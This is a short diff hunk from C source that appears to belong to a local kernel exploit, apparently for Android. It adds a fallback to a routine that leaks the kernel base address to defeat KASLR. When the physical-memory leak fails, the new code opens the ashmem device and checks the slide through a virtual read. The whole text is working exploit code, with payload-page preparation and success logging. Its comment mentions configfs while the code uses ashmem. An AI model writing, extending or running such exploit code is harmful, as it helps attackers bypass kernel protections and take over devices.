@@ -1172,6 +1172,18 @@ static int slide_leak_physical_base(void) {
                elapsed_ms, fresh_attempt, fresh_page_attempts);
     return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
   }
+    // Fallback: virtual verification via configfs read
+  pr_info("p0 physical failed, falling back to virtual verification\n");
+  int ashmem_fd = open_ashmem_device();
+  if (ashmem_fd >= 0) {
+    int ok = verify_slide_virtual(ashmem_fd);
+    close(ashmem_fd);
+    if (ok) {
+      size_t elapsed_ms = (size_t)((gettime_ns() - started) / 1000000ULL);
+      pr_success("p0 virtual fallback elapsed_ms=%zu\n", elapsed_ms);
+      return 1;
+    }
+  }
   return 0;
 #else
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
